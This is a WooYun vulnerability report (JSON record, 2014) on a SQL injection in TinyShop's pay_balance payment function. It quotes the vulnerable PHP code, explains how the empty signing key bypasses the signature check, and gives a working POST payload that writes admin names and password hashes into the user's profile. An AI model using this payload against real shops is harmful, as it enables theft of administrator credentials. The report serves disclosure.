{"id": 43507, "wybug_id": "wooyun-2014-082527", "wybug_title": "TinyShop SQL注入一枚", "wybug_corp": "tinyrise.com", "wybug_author": "zxx", "wybug_date": "2014-11-10 17:48", "wybug_open_date": "2014-12-30 14:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-15：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向公众公开  简要描述： 20140926 详细说明：  因为是支付，会查询订单状态，要先创建一个订单。/protected/controllers/payment.php中 pay_balance函数 total_fee变量\n//余额支付方式，服务器端处理    public function pay_balance(){                $sign = Req::post('sign');//从post中获取sign        $args = Req::post();        unset($args['sign']);        $total_fee = Req::post('total_fee');//直接从post获取        $attach = Filter::int(Req::post('attach'));        $return['attach']     = Req::post('attach');        $return['total_fee']  = floatval(Req::post('total_fee'));        $return['order_no']   = Req::post('order_no');        $return['return_url'] = Req::post('return_url');。。。        if(floatval($return['total_fee']) < 0 || $return['order_no'] == '' || $return['return_url'] == '')        {            $msg = array('type'=>'fail','msg'=>'支付参数不正确！');            $this->redirect('/index/msg',false,$msg);        }        else{//订单正常的话，就开始支付了            $payment = new Payment($attach);//attach为孔的时候，$payment也会为空            $paymentInfo = $payment->getPayment();//paymentInfo为空            $pay_balance = new pay_balance();            $filter_param = $pay_balance->filterParam($args);            //对待签名参数数组排序            $para_sort = $pay_balance->argSort($filter_param);                        $mysign = $pay_balance->buildSign($para_sort,$paymentInfo['partner_key']);//最后$paymentInfo['partner_key']也为空，所以无所谓数据库里key是什么了，直接不用他            if($mysign == $sign)  //sign是post过来的，绕过            {                $user_id = $this->user['id'];                $model = new Model(\"customer\");                $customer = $model->where(\"user_id=\".$user_id)->find();                if($customer['balance']>=$total_fee){                    $order = $model->table(\"order\")->where(\"order_no='\".Filter::sql($return['order_no']).\"' and user_id=\".$user_id)->find();                    if($order){                        if($order['pay_status']==0){                            $flag = $model->table(\"customer\")->where(\"user_id=\".$user_id)->data(array('balance'=>\"`balance`-\".$total_fee))->update();  //total_fee进入查询                            $return['order_status'] = 'TINY_SECCESS';。。。。\n\npublic function buildSign($sort_para,$key,$sign_type = \"MD5\") { //把数组所有元素，按照“参数=参数值”的模式用“&”字符拼接成字符串 $prestr = $this->createLinkstring($sort_para); //把拼接后的字符串再与安全校验码直接连接起来 $prestr = $prestr.$key;  //key为空$mysgin = md5($prestr); return $mysgin; }\nkey也无效了，不具体跟了，我们做一个代理，帮我们生成sign就好。   漏洞证明：  url=http%3A%2f%2f127.0.0.1%2findex.php%3Fcon%3Dpayment%26act%3Dpay_balanceorder_no=20141108134136569665&return_url=111&total_fee=12.00 , `real_name`=(SELECT concat(name,0x5f,password)  from tiny_manager)\n\n404是因为return_url=111\n\n 更新到了个人资料里   修复方案：     版权声明：转载请注明来源 zxx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-30 14:44 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}